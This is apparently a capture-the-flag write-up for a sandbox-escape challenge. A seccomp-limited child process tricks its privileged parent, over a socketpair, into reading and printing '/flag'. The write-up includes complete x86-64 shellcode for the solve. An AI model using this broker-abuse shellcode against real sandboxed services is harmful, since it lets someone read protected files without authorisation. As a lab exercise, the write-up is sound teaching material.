The binary closes every file descriptors from (3 - 10000) this means we can't redirect a file to a file descriptor when running the binary ("./binary 3</file" not available).

The binary then creates a socketpair for our parent_socket and our child_socket, this means that data written to one can be read from the other, and vice-versa.

Parent Socketpair is FD : 3
Child Socketpair is FD : 4

I still need to figure this part out, but basically the challenge registers a cleanup function that will run 1 second from it's initialization and terminate both the parent and the child. The binary uses `alarm(1)` and `signal(SIGALARM, cleanup)`. For now we will just patch the binary and change `alarm(1)` to `alarm(99999999)`, this'll allow easier debugging and testing.

The challenge proceeds to call `fork()` and returns the process id of the just created child process inside a variable named `child_pid` (source code).

## Child Process
The challenge immediately closes every available file descriptor from our child process (0, 1, 2 and 3. 3 being the parent socketpair), then proceeds to read 4096 bytes of shellcode and execute it.

The following syscalls are available :
- **read**
- **write**
- **exit**

Since the child process allows the write syscall, we can write to our child socket pair and ask the parent process to open the "/flag". When the parent process open the "/flag" file it also sends it contents to our child socket pair, this means we can call `read` and we should be able to read the flag value wherever we want.

Next we have to leak the flag, for this i use the print_msg: + flag and send it to our child socket pair.

## Parent Process
The parent process starts by reading 4096 bytes of shellcode from stdin but never executes it, instead it send the shellcode to the child process and the child process will execute the shellcode, it's our only way to possibly interact with our child process since it's closes itself from the world when we run it (closes 0,1,2 and 3).

The parent process then proceeds to enter in a infinite loop, where it receives data from the child process and act accordingly to it. If the data starts with `print_msg` it will print whatever.

## Solution
Used solution to solve the challenge : 
```
.global _start
.intel_syntax noprefix
_start:
    mov rax, 1
    mov rdi, 4
    lea rsi, [rip+flag]
    mov rdx, 120
    syscall
    # read child_socket
    mov rax, 0
    mov rdi, 4
    mov rsi, 0x13370fa
    mov rdx, 0x1000
    syscall
    mov ecx, 0
    xor r8, r8
    xor r9, r9
    lea r11, [rip+command]
    lea r12, [0x13370fa]
loop:
    mov rsi, r11
    mov rdi, r12
    add rsi, rcx
    add rdi, rcx
    mov r9b, byte ptr [rsi]
    mov [rdi], r9b
    cmp rcx, 9
    je nops
    add rcx, 1
    jmp loop
nops:
    mov rax, 1
    mov rdi, 4
    mov rsi, r12
    mov rdx, 120
    syscall
flag:
    .ascii "read_file:/flag\0"
command:
    .ascii "print_msg:"
```